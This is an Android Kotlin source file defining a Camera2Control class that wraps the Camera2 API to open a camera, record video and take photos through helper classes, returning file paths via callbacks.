package com.hc.calling.commands.shadow.vision.camera

import android.content.Context
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Handler
import android.view.Surface
import com.hc.calling.commands.shadow.util.Photographer
import com.hc.calling.commands.shadow.util.VideoRecoder
import com.hc.calling.commands.shadow.vision.Recorder

/**
 * Created by ChanHong on 2019/4/10
 *
 */
class Camera2Control(
    filePath: String,
    context: Context,
    camera: String
) :
    Recorder(filePath, context, camera) {
    var mCameraDevice: CameraDevice? = null
    var mSurfaces: MutableList<Surface>? = null
    var mHandler: Handler? = null
    var mCaptureRequestBuilder: CaptureRequest.Builder? = null
    var mImageReader: ImageReader? = null
    var mCaptureSession: CameraCaptureSession? = null

    var photographer: Photographer? = null

    override fun record(completed: (filePath: String) -> Unit) {
        super.record()
        VideoRecoder(mFilePath).requestRecord(mCameraDevice!!, mSurfaces!!, mHandler!!) {
            completed(it)
        }
    }

    override fun takePhoto(completed: (filePath: String) -> Unit) {
        super.takePhoto(completed)
        Photographer.capture(
            mContext,
            mCaptureRequestBuilder!!,
            mCaptureSession!!,
            mImageReader!!,
            mCameraDevice!!,
            mHandler!!
        ) {
            completed(it)
        }
    }

    override fun initMediaRecorder() {
        photographer = Photographer(mContext) { builder, session, device, imageReader, surfaces, handler ->
            mCameraDevice = device
            mSurfaces = surfaces
            mHandler = handler
            mCaptureRequestBuilder = builder
            mImageReader = imageReader
            mCaptureSession = session

        }.openCamera(mCamera)
    }
}